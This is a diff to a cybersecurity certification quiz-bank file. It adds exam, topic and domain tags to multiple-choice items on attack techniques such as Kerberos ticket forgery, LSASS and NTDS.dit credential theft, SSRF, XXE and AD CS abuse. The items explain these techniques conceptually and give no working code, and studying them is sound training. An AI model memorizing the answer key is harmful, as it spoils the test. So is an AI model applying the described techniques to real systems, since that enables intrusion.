@@ -19001,7 +22040,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Sandbox detonation executes a suspect sample in a controlled isolated environment to capture behavioral indicators safely. It is not wiping DCs, disabling EDR to touch AD schema, or dumping samples to public paste sites as the definition.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.6"
       },
       {
         "question": "In Active Directory attacks, how does a Golden Ticket mainly differ from a Silver Ticket?",
@@ -19013,7 +22055,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Golden Tickets forge TGTs with the KRBTGT hash (broad access to request service tickets). Silver Tickets forge a TGS for one service using that service’s account hash. They are Kerberos constructs, not Linux-only/Azure-only JWT rules, and Silver does not uniquely require DCSync first.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "In network detection, what does malware “beaconing” to a C2 (command-and-control) server typically look like?",
@@ -19025,7 +22070,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Beaconing is repeated check-ins from malware to C2 (HTTP/DNS/etc.), often periodic and stealthy. It is not a one-shot DHCP UDP burst, OSPF mesh rewriting, or email-only traffic with no outbound callbacks.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "4.7"
       },
       {
         "question": "What does AS-REP roasting mainly abuse in Active Directory Kerberos environments?",
@@ -19037,7 +22085,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "AS-REP roasting targets accounts with Kerberos pre-authentication disabled: the attacker obtains AS-REP ciphertext and cracks it offline for the account password. It is not a RADIUS/EAP-TLS flood, BGP community rewrite, or DHCP starvation technique.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "In Kerberos-based attacks, what does Pass-the-Ticket (PtT) mainly involve?",
@@ -19049,7 +22100,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Pass-the-Ticket reuses a stolen Kerberos ticket (often from LSASS/ticket cache) to authenticate without the cleartext password. It is distinct from NTLM hash cracking via LLMNR spoofing, MFA-fatigue phishing, or WPA3 SAE cracking.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Why do attackers often dump credentials from the LSASS process on a Windows host?",
@@ -19061,7 +22115,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "LSASS (Local Security Authority Subsystem Service) caches logon secrets such as NTLM hashes and Kerberos tickets; dumping it fuels PtH/PtT and lateral movement. It is not a printer-queue store, not the sole GPO Wi-Fi PSK vault for Azure join, and not a BIOS/BitLocker TPM unlock ritual.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "3.2"
       },
       {
         "question": "What characterizes fileless malware in endpoint attacks?",
@@ -19073,7 +22130,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Fileless malware favors memory-resident or living-off-the-land execution (PowerShell/WMI/etc.) so classic on-disk signature scanning struggles. It is not limited to air-gapped printers, not defined as USB-only EXE worms, and not synonymous with ransomware-only disk encryption.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "2.8"
       },
       {
         "question": "In cyber threat scenarios, what does island hopping typically describe?",
@@ -19085,7 +22145,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Island hopping abuses trust in a connected third party (supplier/MSP/partner): breach the weaker island, then pivot into the real target. It is not courier air-gap disk moves, not pure local VLAN hopping, and not a definition of ultra-fast C2 domain rotation.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "How do Domain Generation Algorithms (DGAs) commonly help malware maintain command-and-control reachability?",
@@ -19097,7 +22160,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "DGAs produce many possible domain names; attackers register the ones they need so malware can rediscover C2 after takedowns. They are not single hard-coded IPs, not USB /etc/hosts-only, and not OSPF LSDB-in-TXT tricks.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.9"
       },
       {
         "question": "What is server-side request forgery (SSRF)?",
@@ -19109,7 +22175,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "In SSRF the server itself is abused as a proxy, often to reach internal-only systems or cloud metadata (e.g., 169.254.169.254) and steal credentials. Option 1 describes XSS, option 2 CSRF (client-side forgery), and option 4 a SYN flood.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "How does domain fronting help malware hide its command-and-control (C2) traffic?",
@@ -19121,7 +22190,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Domain fronting abuses CDNs: the visible layers (DNS, SNI) name a trusted domain, but the inner Host header routes the request to the attacker's service on the same CDN, so blocking it means blocking the popular domain. Option 1 is DGA, option 2 DNS hijacking/pharming, and option 3 ICMP tunneling.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.9"
       },
       {
         "question": "During incident response, which evidence should normally be collected first according to the order of volatility?",
@@ -19133,7 +22205,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "The order of volatility says to capture the most short-lived data first: registers, cache, RAM, process and network state, then temporary files, disk, remote logs and finally archival media. Backups and disk images are far less volatile than memory.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.6"
       },
       {
         "question": "An attacker loads a bank's transfer page inside an invisible iframe on a game site and tricks users into clicking a hidden Confirm button. What is this attack and a standard defense?",
@@ -19145,7 +22220,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Clickjacking (UI redressing) overlays a framed legitimate page under a decoy so the victim clicks real buttons. The fix is to forbid framing with X-Frame-Options or Content-Security-Policy frame-ancestors. No script is injected, no SQL is altered and DNS resolution is untouched.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "A malicious site's domain first resolves to the attacker's server with a very short TTL, then re-resolves to 192.168.1.1, letting the victim's browser send requests to the home router's admin page. What is this technique?",
@@ -19157,7 +22235,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "DNS rebinding abuses short TTLs: the hostname (same origin) is switched to a private IP, so the attacker's JavaScript can talk to internal devices. Defenses include resolvers blocking private answers for public names, Host-header checks and authentication on internal services. Cache poisoning forges resolver data, DGA is for C2 resilience and tunneling is for exfiltration.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "A company's build server pulls an internal package named acme-utils. An attacker publishes acme-utils version 99.0 on the public npm registry, and the build installs it. What is this attack and a key mitigation?",
@@ -19169,7 +22250,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Dependency confusion exploits package managers that prefer the highest version across public and private sources. Scopes/namespaces, a single private registry (proxying public), version pinning and lockfiles prevent it. Typosquatting relies on misspelled names, a watering hole compromises a site victims visit, and man-in-the-browser is browser-session malware.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "3.7"
       },
       {
         "question": "A logged-in user changes the URL /api/invoices/1043 to /api/invoices/1044 and sees another customer's invoice. Which vulnerability is this?",
@@ -19181,7 +22265,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "IDOR (part of OWASP Broken Access Control) happens when the app trusts an object ID from the client without checking that the logged-in user may access it. The fix is a server-side authorization check on every object (random IDs alone are not enough). CSRF forges requests from the victim's browser, traversal uses ../ to reach files and session fixation reuses a pre-set session ID.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "Users with push-notification MFA are phished through a reverse proxy that shows the real Microsoft 365 login page. The attacker then signs in without any MFA prompt. What happened, and what resists it best?",
@@ -19193,7 +22280,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "AiTM kits (e.g. Evilginx) relay the real login, so the victim completes MFA and the proxy captures the session cookie, which the attacker replays. FIDO2/passkeys are bound to the real domain and will not sign for the proxy's domain; conditional access and token binding also help. MFA fatigue needs repeated prompts, SIM swapping targets SMS and spraying only guesses passwords.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.4"
       },
       {
         "question": "An employee clicks a link and approves an app called 'PDF Viewer' that asks for Mail.Read and offline_access in Microsoft 365. Later, mail is read even after the employee's password is reset. What is this?",
@@ -19205,7 +22295,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "In consent phishing the attacker never needs the password: the user grants a malicious OAuth app delegated permissions, and offline_access gives it a refresh token that survives a password reset. Fix it by revoking the app's consent and tokens and restricting user consent to verified publishers or admin approval. Credential stuffing and stolen cookies are cut off by a reset with session revocation, and typosquatting is just a lookalike domain.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.4"
       },
       {
         "question": "A login form builds SQL with string concatenation from the username field. Which defense best stops classic SQL injection here?",
@@ -19217,7 +22310,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Parameterized queries / prepared statements separate the SQL statement from bound values, so input cannot change the query structure. WAFs help as defense-in-depth but miss novel payloads; hashing the username still leaves a concatenated query; numeric casting helps one field but is not a general fix and error-based tricks can remain.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.6"
       },
       {
         "question": "On Windows, a service ImagePath is C:\\Program Files\\Vendor App\\service.exe without quotes, and Authenticated Users can write to C:\\Program Files\\Vendor App\\. How can a local attacker escalate to the service account?",
@@ -19229,7 +22325,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Unquoted service paths with spaces make the Service Control Manager try C:\\Program.exe, then C:\\Program Files\\Vendor.exe, then the real path. Write permission in an earlier folder lets an attacker drop a binary the SCM runs as the service identity (often LocalSystem). PATH hijacking is a different issue; SeDebug/LSASS dump is another technique; DependOnService does not reinstall from UNC that way.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "3.2"
       },
       {
         "question": "Which statement best distinguishes stored XSS from reflected XSS in a typical web application?",
@@ -19241,7 +22340,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Stored (persistent) XSS saves the payload in an application store (comment, profile, ticket) so other users later receive and execute it. Reflected XSS takes the payload from the request and reflects it in that response (often via a malicious URL). Transport HTTP/HTTPS and client certs do not define the difference; neither XSS type is about DNS/ARP poisoning; extensions are unrelated to the classic classification.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.6"
       },
       {
         "question": "A banking site relies on session cookies for authenticated POSTs. Which defense best stops classic CSRF on a state-changing transfer?",
@@ -19253,7 +22355,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Classic CSRF uses the browser’s automatic cookie send on a forged cross-site request. Synchronizer/anti-CSRF tokens (or strict SameSite cookies) ensure the forged request lacks a secret only the legitimate app page can read. Disabling TLS does not stop cookie sends; MD5 of a public account number is not a CSRF secret; ACAO * does not block credentialed CSRF and is the opposite of a tight CORS policy.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "Why is UEFI Secure Boot (or Measured Boot with TPM attestations) still useful even when the disk is fully encrypted with BitLocker-class FDE?",
@@ -19265,7 +22370,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Full disk encryption protects confidentiality of data at rest, but a compromised bootloader or kernel can run before/during unlock and subvert the OS. Secure Boot verifies signatures on boot components; Measured Boot/attestation records hashes in the TPM for remote verification. FDE is not replaced by Secure Boot; Secure Boot does not stop phishing; signed boot code still needs patching and does not imply the whole OS is bug-free.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.3"
       },
       {
         "question": "What does an XML External Entity (XXE) attack mainly abuse in a vulnerable parser?",
@@ -19277,7 +22385,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "XXE abuses XML parsers that process external entity references. A crafted document can make the server fetch file:// resources or internal HTTP URLs (often overlapping with SSRF-like impact). It is not a DGA DNS flood, not ARP spoofing, and not a Secure Boot/bootloader attack.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "In Windows malware tradecraft, what does process hollowing mainly involve?",
@@ -19289,7 +22400,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Process hollowing creates a legitimate process in a suspended state, hollows out (unmaps) its memory image, injects attacker code, then resumes so the malicious payload runs under a trusted process name. It is not MBR-only ransomware, not rogue DHCP/DNS, and not AS-REP roasting (a Kerberos pre-auth weakness).",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "2.8"
       },
       {
         "question": "What is Microsoft Sysmon mainly used for on Windows endpoints in a blue-team monitoring design?",
@@ -19301,7 +22415,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Sysmon (System Monitor) is a Windows system service/driver that logs rich telemetry—process creates, network connections, file/registry changes, and more—into the Windows event log for SIEM or detection engineering. It does not replace Defender AV, is not BitLocker, and is not a VPN client.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "What does a typical WAF bypass attempt mainly try to achieve against a web application firewall?",
@@ -19313,7 +22430,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "WAF bypasses abuse gaps between what the WAF normalizes/matches and what the backend app accepts—encodings, path confusion, HTTP verb/content-type tricks, and similar. It is not a DGA DNS flood, ARP spoofing, or Secure Boot attack.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "2.1"
       },
       {
         "question": "In Windows tradecraft, what does DLL sideloading mainly involve?",
@@ -19325,7 +22445,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "DLL sideloading abuses how Windows apps resolve DLL paths: an attacker drops a malicious DLL that a legitimate signed binary loads, often to blend into trusted processes and bypass simple application allow-lists. It is not MBR-only ransomware, rogue DHCP/DNS, or AS-REP roasting.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "2.8"
       },
       {
         "question": "In Active Directory, why is unconstrained Kerberos delegation considered especially dangerous if an attacker compromises that host?",
@@ -19337,7 +22460,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "With unconstrained delegation, a computer/service receives and can forward TGTs of users who connect to it, enabling impersonation to other services if the host is compromised. It does not disable Kerberos for LDAP binds, auto-promote service accounts to Domain Admin, or put BitLocker keys in SYSVOL.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
       },
       {
         "question": "What does the PrintNightmare class of vulnerabilities mainly abuse in a Windows environment?",
@@ -19349,7 +22475,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "PrintNightmare-style issues abuse the Print Spooler (and related driver installation paths) to achieve remote/local code execution as SYSTEM. Mitigations include disabling the spooler where unused, restricting driver installation, and patching. It is not a BGP Null0 trick, Secure Boot key swap, or anonymous NTDS.dit share.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "2.8"
       },
       {
         "question": "In Active Directory Certificate Services (AD CS) abuse, what does the ESC1 technique mainly rely on?",
@@ -19361,7 +22490,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "ESC1 abuses overly permissive AD CS templates (e.g. client authentication EKU, enrollee-supplied SAN, Domain Users enrollment) so an attacker enrolls a certificate impersonating another principal and then uses it for authentication. It is not KRBTGT-only Silver Ticket theft, WPAD/DHCP 252 Kerberos interception, or SMB-signing GPO as the ESC1 core.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "cripto",
+        "domain": "1.5"
       },
       {
         "question": "How does RASP (Runtime Application Self-Protection) mainly differ from a traditional network or reverse-proxy WAF?",
@@ -19373,7 +22505,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "RASP hooks or instruments the application runtime (libraries, interpreters, agents) so detections use real code paths, data flows, and users—context a perimeter WAF usually lacks. A WAF still filters at HTTP/edge policy layer. RASP is not BGP/OSPF inspection, not a TLS-removal feature, and not merely an offline sandbox.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "3.6"
       },
       {
         "question": "What is BloodHound mainly used for in Active Directory security assessments?",
@@ -19385,7 +22520,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "BloodHound (and collectors like SharpHound) enumerate AD relationships and ACLs into a graph so analysts/attackers can find privilege-escalation paths (e.g. to Domain Admin). It does not rotate KRBTGT on a schedule, act as a WAF for Kerberoasting, or encrypt LSASS by itself.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "1.3"
       },
       {
         "question": "In modern Active Directory abuse, what do Shadow Credentials mainly involve?",
@@ -19397,7 +22535,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Shadow Credentials abuse the msDS-KeyCredentialLink attribute (often via Key Trust / Windows Hello for Business style keys) so an attacker who can write that attribute adds their key material and then obtains tickets as the victim using PKINIT. It is not krbtgt SPN unconstrained-delegation setup, a GPO that only disables signing/binding, or DANE TLSA replacement.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.5"
       },
       {
         "question": "On a Microsoft Entra ID–joined Windows device, what is a Primary Refresh Token (PRT) mainly used for?",
@@ -19409,7 +22550,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "A PRT is issued to Entra-joined/hybrid-joined devices and enables single sign-on: the device can obtain access tokens for cloud resources without prompting the user repeatedly. Theft/abuse of PRT material is a living-off-cloud style concern. It is not BitLocker escrow, a SAM/NTLM hash replay blob, or a tenant-wide anonymous SAS.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
       },
       {
         "question": "In cloud environments, why is SSRF that reaches the instance metadata service (IMDS, e.g. 169.254.169.254) especially dangerous?",
@@ -19421,7 +22565,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "IMDS often serves IAM role credentials (or similar short-lived tokens) to the instance. SSRF that can query that link-local endpoint can steal those credentials and abuse cloud APIs. It is not merely a hostname/DNS trick, a BGP spoof enabler, or an SSLv3 downgrade of all egress TLS.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.1"
       },
       {
         "question": "What does an OAuth device-code phishing attack mainly trick a victim into doing?",
@@ -19433,7 +22580,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Device authorization flow shows a user code and a verification URI. Attackers phish victims into approving the attacker’s app (often via a convincing page), yielding tokens for the attacker. It is not an LSASS Bearer rewrite, an MFA-off SAML forge that skips TLS, or a permanent JWKS swap.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.4"
       },
       {
         "question": "On Windows, what does abusing SeImpersonatePrivilege (e.g. Potato-family techniques) mainly achieve for a local attacker?",
@@ -19445,7 +22595,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "SeImpersonatePrivilege allows a process to impersonate clients that connect to it. Potato-style attacks coerce a privileged service to authenticate to the attacker’s pipe/listener and then impersonate that high-privilege token (often SYSTEM). It is not KRBTGT rewrite, ELAM/Tamper Protection bypass by itself, or a forced NTLMv1 downgrade of all SMB.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "3.2"
       },
       {
         "question": "What does a PetitPotam-style attack mainly coerce a Windows host (often a DC) into doing?",
@@ -19457,7 +22610,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "PetitPotam abuses MS-EFSRPC (and similar) to coerce authentication toward an attacker. Combined with NTLM relay (or related techniques), that can lead to further domain compromise. It is not itself a KRBTGT rewrite, a Credential Guard bypass by hive swap, or a forced NTLMv1 downgrade of all SMB.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.5"
       },
       {
         "question": "What did the Zerologon vulnerability (CVE-2020-1472) mainly allow an attacker on the network to do against an unpatched domain controller?",
@@ -19469,7 +22625,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Zerologon abused a Netlogon crypto flaw (all-zero IV) so an attacker could impersonate a client and set the DC's machine account password to a known/empty value, enabling further takeover. It is not BitLocker key theft via empty GCM tags alone, a Defender Tamper Protection toggle, or Golden Tickets without KRBTGT.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "What does enabling Windows Credential Guard mainly protect against on a supported host?",
@@ -19481,7 +22640,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Credential Guard uses virtualization-based security to isolate secrets so malware running as admin cannot simply dump them from LSASS. It does not stop domain-wide Golden Tickets by itself, disable all NetNTLM/relay, or act as anti-ransomware disk encryption.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.1"
       },
       {
         "question": "What does a DCShadow attack mainly abuse in Active Directory replication?",
@@ -19493,7 +22655,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "DCShadow makes a machine act as a DC and injects attacker-controlled changes into AD replication. It is not PetitPotam coercion, offline KRBTGT editing, or flooding forged TGTs.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Why do attackers sometimes add a backdoor ACE on the AdminSDHolder object in Active Directory?",
@@ -19505,7 +22670,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "SDProp (Security Descriptor Propagator) reapplies AdminSDHolder's ACL to protected groups (e.g. Domain Admins) on a schedule. A backdoor ACE there can restore attacker rights after cleanup. It does not store KRBTGT in cleartext, grant workstation local admin, or disable preauth.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "How does overpass-the-hash (pass-the-key) differ from classic pass-the-hash against Active Directory?",
@@ -19517,7 +22685,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Overpass-the-hash / pass-the-key turns a stolen key/hash into a Kerberos TGT (e.g. via mimikatz), so later access uses tickets rather than raw NTLM PtH on each resource. It is not LM-only, KRBTGT rewrite, or GPO-based signing disable.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "In a Golden SAML attack against a federated environment such as AD FS, what does the attacker mainly steal and abuse?",
@@ -19529,7 +22700,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Golden SAML means stealing the federation server token-signing key and forging signed SAML assertions for any user, often bypassing MFA at the service provider. It is not KRBTGT abuse, DHCP spoofing, or SMTP relay misuse.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.5"
       },
       {
         "question": "An attacker can write to a target computer object's msDS-AllowedToActOnBehalfOfOtherIdentity attribute and controls a machine account. What does resource-based constrained delegation abuse let them do?",
@@ -19541,7 +22715,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "With write access to msDS-AllowedToActOnBehalfOfOtherIdentity, the attacker lets their machine account delegate to the target, then uses S4U2Self/S4U2Proxy to impersonate a privileged user to that host. It does not reset KRBTGT, disable pre-auth, or rely on SYSVOL scripts.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "On a Windows network that does not actively use IPv6, how does a mitm6-style attack usually get between clients and the network?",
@@ -19553,7 +22730,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Windows prefers IPv6 and requests DHCPv6 by default. mitm6 answers as a rogue DHCPv6 server, sets itself as DNS, and then captures or relays authentication (for example to LDAP). Mitigate by blocking rogue DHCPv6/RA or disabling unused IPv6 and enforcing LDAP signing.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.5"
       },
       {
         "question": "On a Windows LAN where hosts still fall back to LLMNR or NBT-NS for name resolution, how does a Responder-style attack typically work?",
@@ -19565,7 +22745,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Responder-style tools poison LLMNR/NBT-NS by answering when DNS fails, then capture or relay the resulting authentication. They do not need SYSVOL GPO DNS changes, Kerberos disablement, or DHCP starvation as the core mechanism.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.5"
       },
       {
         "question": "In AD CS abuse, what does the ESC8 scenario mainly combine to obtain a certificate for a privileged machine or user context?",
@@ -19577,7 +22760,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "ESC8 abuses NTLM relay to HTTP-based AD CS web enrollment when protections like EPA are missing, letting the attacker request a certificate in the relayed victim's context. It is not primarily offline CA-key theft, unconstrained delegation on templates, or swapping root CAs in GPO.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "scor",
+        "topic": "cripto",
+        "domain": "1.5"
       },
       {
         "question": "After compromising a workstation, an attacker wants to decrypt a user's saved browser passwords and Wi-Fi keys protected by Windows DPAPI. What is a realistic approach?",
@@ -19589,7 +22775,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "DPAPI blobs are encrypted with a masterkey derived from the user's credentials; with the user's password/hash or the domain backup key, an attacker can recover the masterkey and decrypt saved secrets. The blobs are not plaintext, and safe mode or blanking the password does not strip DPAPI.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "3.2"
       },
       {
         "question": "With admin rights on a domain controller, an attacker wants every domain password hash offline. Why use a Volume Shadow Copy (vssadmin/ntdsutil) to grab NTDS.dit?",
@@ -19601,7 +22790,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "The live NTDS.dit is locked by NTDS, so attackers use a Volume Shadow Copy or ntdsutil IFM to obtain a consistent copy of the database plus the SYSTEM hive (for the boot key) and extract hashes offline. The file is encrypted, not a cleartext CSV, and shadow copies do not disable replication or exfiltrate to a cloud.",
-        "difficulty": "Hard"
+        "difficulty": "Hard",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "A user completed MFA and has an active cloud session. An attacker steals the browser session cookie and replays it. Why can this bypass MFA?",
@@ -19613,7 +22805,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "A session cookie represents an already-authenticated session; replaying a valid, unexpired cookie (pass-the-cookie) lets an attacker reuse the post-MFA session without re-authenticating. Cookies do not contain the cleartext password or OTP, MFA is not a one-time lifetime check, and cookies do not disable TLS.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.7"
       },
       {
         "question": "After gaining code execution as SYSTEM on a domain controller, an attacker wants any account to authenticate with one master password while real passwords still work. Which persistence technique matches?",
@@ -19625,7 +22820,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Skeleton Key patches LSASS on a domain controller so a attacker-chosen master password works for any account alongside real passwords. Pass-the-hash, Kerberoasting, and AS-REP roasting do not install that DC-wide dual-password backdoor.",
-        "difficulty": "Medium"
+        "difficulty": "Medium",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
